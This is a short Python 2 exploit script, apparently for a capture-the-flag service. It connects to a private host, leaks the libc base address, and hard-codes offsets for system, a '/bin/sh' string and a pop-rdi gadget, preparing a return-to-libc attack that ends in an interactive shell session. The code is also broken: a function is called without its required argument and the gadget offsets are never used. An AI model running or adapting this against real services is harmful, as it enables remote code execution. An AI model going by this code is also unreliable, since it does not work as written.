


from socket import *
import struct
from telnetlib import *


p = lambda x:struct.pack("<Q",x)
up = lambda x:struct.unpack("<Q",x)

def recvuntil(t):
        data = ''
        while not data.endswith(t):
                tmp = s.recv(1)
                if not tmp: break
                data += tmp
        return data

def libcaddress(a):
	s.send("1\n")
	print recvuntil("libc.so.6: ")
	libc_base = int(s.recv(18).split()[0],16)
	print hex(libc_base)
	return a
def systemaddr():
	s.send("2\n")
	print recvuntil("Enter symbol: ")
	s.send("system\n")
	system_addr = int(s.recv(18).split()[2],16)
	print system_addr


HOST = "10.211.55.8"
PORT = 11111

s = socket(AF_INET,SOCK_STREAM)
s.connect((HOST,PORT))

libc_system = 0x46640
libc_binsh = 0x17ccdb
poprdiret = 0x471fc


print recvuntil("4) Exit\n:")

libcaddress()

#systemaddr()

t = Telnet()
t.sock = s
t.interact()
s.close()